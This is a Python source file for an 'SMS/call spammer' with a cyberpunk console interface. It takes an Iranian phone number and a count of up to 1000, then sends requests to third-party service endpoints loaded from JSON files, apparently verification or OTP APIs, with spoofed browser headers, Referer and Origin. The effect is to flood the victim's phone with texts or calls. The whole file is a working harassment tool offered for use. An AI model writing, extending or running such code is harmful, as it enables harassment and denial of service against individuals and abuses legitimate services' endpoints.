import os
from typing import ClassVar, Dict, Optional
import re
import requests
import time
import json
from pathlib import Path

class ConsoleUI:
    """A class for handling console UI elements and styling"""
    
    # ANSI Color Codes with Cyberpunk/Hacker theme
    NEON_PINK: ClassVar[str] = '\033[38;5;198m'      # Bright neon pink
    NEON_GREEN: ClassVar[str] = '\033[38;5;46m'      # Matrix-style green
    NEON_BLUE: ClassVar[str] = '\033[38;5;51m'       # Bright cyan/blue
    ACID_GREEN: ClassVar[str] = '\033[38;5;118m'     # Toxic green
    NEON_ORANGE: ClassVar[str] = '\033[38;5;208m'    # Bright orange (replacing yellow)
    NEON_RED: ClassVar[str] = '\033[38;5;196m'       # Bright digital red
    RESET: ClassVar[str] = '\033[0m'
    BOLD: ClassVar[str] = '\033[1m'
    DIM: ClassVar[str] = '\033[2m'                   # For subtle effects
    BLINK: ClassVar[str] = '\033[5m'                 # For warning effects

    # Message style mapping with cyberpunk theme
    _STYLES: ClassVar[Dict[str, str]] = {
        "success": ACID_GREEN,     # Success in toxic green
        "warning": NEON_ORANGE,    # Warnings in bright orange
        "error": NEON_RED,         # Errors in digital red
        "info": NEON_BLUE,         # Info in bright cyan
        "header": NEON_PINK        # Headers in neon pink
    }

    _SYMBOLS: ClassVar[Dict[str, str]] = {
        "+": "success",
        "*": "warning",
        "-": "error",
        "@": "info",
        "#": "header"
    }

    @classmethod
    def print_styled(cls, action: str, message: str = "") -> str:
        """
        Print a styled message with a cyberpunk indicator
        
        Args:
            action: Message type ("+", "*", "-", "@", "#") or style name
            message: The message to display
            
        Returns:
            str: Formatted message with color
        """
        if action in cls._STYLES:
            color = cls._STYLES[action]
        else:
            style_name = cls._SYMBOLS.get(action, "header")
            color = cls._STYLES[style_name]
        
        # Add blinking effect for errors and warnings
        if action in ["-", "*"] or action in ["error", "warning"]:
            indicator = f"{cls.BLINK}●{cls.RESET}"
        else:
            indicator = "●"
            
        return f"[{color}{indicator}{cls.RESET}] {color}{message}{cls.RESET}"

    @classmethod
    def display_banner(cls) -> None:
        """Display the welcome banner with ASCII art"""
        print(cls.NEON_GREEN + cls.BOLD + """
──────────────────████
─────────────────█░░███
─────────────────█░░████
──────────────────███▒██─────████████
────────████████─────█▒█──████▒▒▒▒▒▒████
──────███▒▒▒▒▒▒████████████░░████▒▒▒▒▒███
────██▒▒▒▒░▒▒████░░██░░░░██░░░░░█▒▒▒▒▒▒▒███
───██▒▒░░░░▒██░░░░░█▒░░░░░██▒░░░░░░░▒▒▒▒▒▒█
──██▒░░░░░▒░░░░░░░░░▒░░░░░░░▒▒░░░░░░░▒▒▒▒▒██
──█░░░░░░▒░░░██░░░░░░░░░░░░░██░░░░░░░░▒▒▒▒▒█
──█░░░░░░░░█▒▒███░░░░░░░░░█▒▒███░░░░░░░▒▒▒▒█
──█░░░░░░░████████░░░░░░░████████░░░░░░▒▒▒▒█
──█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█
──██░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▒▒▒▒█
───█░░░░██░█░░░░░░░░░░░░░░░░░░░░░░░███▒▒▒▒▒█
───█▒▒░░░░█████░░░█░░░░██░░░██░░████░▒▒▒▒▒▒█
───██▒▒░░░░░█████████████████████░░░▒▒▒▒▒▒██
────██▒▒▒▒░░░░░██░░░███░░░██░░░█░░░▒▒▒▒▒▒██
─────███▒▒▒░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█████
───────███▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒▒▒████
──────────██████████████████████████

╻ ╻┏━╸╻  ┏━╸┏━┓┏┳┓┏━╸   ╺┳╸┏━┓   ┏━┓┏━┓┏━┓┏┳┓┏┳┓┏━╸┏━┓
┃╻┃┣╸ ┃  ┃  ┃ ┃┃┃┃┣╸     ┃ ┃ ┃   ┗━┓┣━┛┣━┫┃┃┃┃┃┃┣╸ ┣┳┛
┗┻┛┗━╸┗━╸┗━╸┗━┛╹ ╹┗━╸    ╹ ┗━┛   ┗━┛╹  ╹ ╹╹ ╹╹ ╹┗━╸╹┗╸
""" + cls.RESET)

    @classmethod
    def display_heart(cls) -> None:
        """Display heart ASCII art"""
        print(cls.NEON_PINK + cls.BOLD + """
────────────────────▒
───────────────────░█
──────────────────███
─────────────────██ღ█
────────────────██ღ▒█──────▒█
───────────────██ღ░▒█───────██
───────────────█ღ░░ღ█──────█ღ▒█
──────────────█▒ღ░▒ღ░█───██░ღღ█
─────────────░█ღ▒░░▒ღ░████ღღღ█
─────░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
─────▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
─────██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
─────██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
────██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
────█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
───██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
───█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
──██ღღ▒████████████ღღ████████████░ღ█▒
──█░ღღ████████████████████████████ღღ█
──█▒ღ██████████████████████████████ღ█
──██ღღ████████████████████████████ღ██
───██ღღ██████████████████████████ღ██
────░██ღღ██████████████████████ღღ██
──────▓██ღ▒██████████████████▒ღ██
─────░──░███ღ▒████████████▒ღ███
──────░░───▒██ღღ████████▒ღ██
─────────────▒██ღ██████ღ██
───────────────██ღ████ღ█
─────────────────█ღ██ღ█
──────────────────█ღღ█
──────────────────█ღ█░
───────────────────██░
""" + cls.RESET)

    @classmethod
    def display_menu(cls) -> None:
        """Display the main menu options"""
        print(cls.NEON_GREEN + """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━┓
┃ SMS                        ┃   1   ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━┫
┃ Call                       ┃   2   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━┛
""" + cls.RESET)

    @staticmethod
    def clear_screen() -> None:
        """Clear the console screen"""
        os.system('clear' if os.name == 'posix' else 'cls')

class Message:
    """A class for handling user interaction messages and prompts"""

    @staticmethod
    def prompt_refresh() -> None:
        """Prompt user to press enter to refresh the page"""
        input(ConsoleUI.print_styled("info", "Press enter to refresh the page "))

    @staticmethod
    def show_exit() -> str:
        """Display exit message"""
        return ConsoleUI.print_styled("error", "You exited the program! ")

    @staticmethod
    def show_success(message: str) -> str:
        """Display a success message"""
        return ConsoleUI.print_styled("success", message)

    @staticmethod
    def show_error(message: str) -> str:
        """Display an error message"""
        return ConsoleUI.print_styled("error", message)

    @staticmethod
    def show_warning(message: str) -> str:
        """Display a warning message"""
        return ConsoleUI.print_styled("warning", message)

    @staticmethod
    def show_info(message: str) -> str:
        """Display an info message"""
        return ConsoleUI.print_styled("info", message)

    @staticmethod
    def confirm_action(action: str) -> bool:
        """
        Ask user to confirm an action
        
        Args:
            action: The action to confirm
            
        Returns:
            bool: True if user confirms, False otherwise
        """
        response = input(ConsoleUI.print_styled("warning", f"{action} (Y/n): ")).lower()
        return response != 'n' and response != 'no'

class Spammer:
    """A class for handling spam operations"""
    
    _option: Optional[str] = None
    _phone_number: Optional[str] = None
    _repetition: Optional[int] = None
    
    VALID_OPTIONS = {"1": "sms", "2": "call"}
    PHONE_PATTERN = re.compile(r'^9\d{9}$')  # Regex for validating Iranian phone numbers
    
    @classmethod
    def clear(cls) -> None:
        """Clear the screen and reset all class variables"""
        ConsoleUI.clear_screen()
        cls._option = None
        cls._phone_number = None
        cls._repetition = None

    @classmethod
    def run(cls) -> None:
        """Main program loop"""
        try:
            while True:
                cls.clear()
                ConsoleUI.display_banner()
                ConsoleUI.display_menu()
                cls.get_option()
        except KeyboardInterrupt:
            print(Message.show_exit())
        except Exception as e:
            print(Message.show_error(f"An unexpected error occurred: {str(e)}"))

    @classmethod
    def get_option(cls) -> None:
        """Get and validate user option"""
        cls._option = input(ConsoleUI.print_styled("info", "Enter the option (1/2 or q to quit): "))
        
        if cls._option.lower() == 'q':
            raise KeyboardInterrupt
            
        if cls._option not in cls.VALID_OPTIONS:
            print(Message.show_error("Invalid option!"))
            Message.prompt_refresh()
            return
            
        # Call the corresponding method using dictionary mapping
        method = getattr(cls, cls.VALID_OPTIONS[cls._option])
        method()

    @classmethod
    def validate_phone_number(cls, phone: str) -> bool:
        """
        Validate phone number format
        
        Args:
            phone: Phone number to validate
            
        Returns:
            bool: True if valid, False otherwise
        """
        return bool(cls.PHONE_PATTERN.match(phone))

    @classmethod
    def get_phone_number(cls) -> None:
        """Get and validate phone number from user"""
        while True:
            phone = input(ConsoleUI.print_styled("info", "Enter the phone number (9XXXXXXXXX): "))
            
            if cls.validate_phone_number(phone):
                cls._phone_number = phone
                break
            else:
                print(Message.show_error("Invalid phone number! Format: 9XXXXXXXXX"))
                if not Message.confirm_action("Try again?"):
                    raise KeyboardInterrupt

    @classmethod
    def get_repetition(cls) -> None:
        """Get and validate repetition count from user"""
        while True:
            try:
                rep = input(ConsoleUI.print_styled("info", "Enter number of messages (max 1000): "))
                repetition = int(rep)
                if 1 <= repetition <= 1000:
                    cls._repetition = repetition
                    break
                print(Message.show_error("Please enter a number between 1 and 1000"))
            except ValueError:
                print(Message.show_error("Please enter a valid number"))
            
            if not Message.confirm_action("Try again?"):
                raise KeyboardInterrupt

    @classmethod
    def load_services(cls, service_type: str) -> dict:
        """
        Load API services from JSON file
        
        Args:
            service_type: Type of service ('sms' or 'call')
            
        Returns:
            dict: API services configuration
        """
        try:
            # Get the directory where the script is located
            base_dir = Path(__file__).parent
            file_path = base_dir / 'data' / f'{service_type}_services.json'
            
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            print(Message.show_error(f"Services file not found: {service_type}_services.json"))
            return {}
        except json.JSONDecodeError:
            print(Message.show_error(f"Invalid JSON in services file: {service_type}_services.json"))
            return {}

    @classmethod
    def send_request(cls, service_type: str) -> None:
        """
        Send requests to various APIs
        
        Args:
            service_type: Type of service ('sms' or 'call')
        """
        from requests.exceptions import RequestException, Timeout
        
        message_index = 0
        target_number = cls._phone_number
        
        # Default headers with more browser-like values
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Content-Type': 'application/json',
            'sec-ch-ua': '"Not_A Brand";v="24", "Chromium";v="96"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        
        # Load services from JSON file
        api_services = cls.load_services(service_type)
        if not api_services:
            print(Message.show_error("No services available"))
            Message.prompt_refresh()
            return
        
        for api_name, api_service in api_services.items():
            if message_index >= cls._repetition:
                break
            
            try:
                # Format URL with phone number
                api_url = api_service["url"].format(phone=target_number)
                
                # Get request method (default to POST)
                method = api_service.get("method", "post").lower()
                
                # Get headers and format data...
                headers = default_headers.copy()
                if "headers" in api_service:
                    headers.update(api_service["headers"])
                
                api_data = cls.format_data(api_service["data"], target_number)
                
                # Add referer and origin based on URL
                url_parts = api_url.split('/')
                base_url = f"{url_parts[0]}//{url_parts[2]}"
                headers.update({
                    'referer': f"{base_url}/",
                    'origin': base_url
                })
                
                # Send request based on method
                if method == "get":
                    response = requests.get(
                        api_url,
                        params=api_data,  # Use params for GET requests
                        headers=headers,
                        timeout=5
                    )
                else:  # default to POST
                    response = requests.post(
                        api_url,
                        json=api_data,
                        headers=headers,
                        timeout=5
                    )
                
                status = "success" if response.ok else "warning"
                print(ConsoleUI.print_styled(
                    status, 
                    f"Send {service_type.upper()} +1 ({message_index+1}/{cls._repetition}) ({api_name}) -> {response.reason}"
                ))
                
                if response.ok:
                    message_index += 1
                    
            except Timeout:
                print(ConsoleUI.print_styled(
                    "error", 
                    f"Timeout for {api_name}"
                ))
                continue
                
            except RequestException:
                print(ConsoleUI.print_styled(
                    "error", 
                    f"Failed for {api_name}"
                ))
                continue
                
            except KeyError:
                print(ConsoleUI.print_styled(
                    "error", 
                    f"Invalid service configuration for {api_name}"
                ))
                continue
                
            except Exception:
                print(ConsoleUI.print_styled(
                    "error", 
                    f"Unexpected error for {api_name}"
                ))
                continue
            
            time.sleep(0.1)
        
        if message_index < cls._repetition:
            print(ConsoleUI.print_styled("*", "Your API services do not have the capacity for the entered value."))
        ConsoleUI.display_heart()
        print(ConsoleUI.print_styled("#", f"{service_type.upper()} sent successfully (:"))
        Message.prompt_refresh()

    @classmethod
    def format_data(cls, data: dict, phone: str) -> dict:
        """Format request data, handling nested dictionaries"""
        formatted = {}
        for key, value in data.items():
            if isinstance(value, dict):
                formatted[key] = cls.format_data(value, phone)
            elif isinstance(value, str):
                formatted[key] = value.format(phone=phone)
            else:
                formatted[key] = value
        return formatted

    @classmethod
    def sms(cls) -> None:
        """Handle SMS spam operation"""
        try:
            cls.get_phone_number()
            cls.get_repetition()
            cls.send_request('sms')
        except KeyboardInterrupt:
            print("\n" + Message.show_info("SMS operation cancelled"))
            Message.prompt_refresh()

    @classmethod
    def call(cls) -> None:
        """Handle call spam operation"""
        try:
            cls.get_phone_number()
            cls.get_repetition()
            cls.send_request('call')
        except KeyboardInterrupt:
            print("\n" + Message.show_info("Call operation cancelled"))
            Message.prompt_refresh()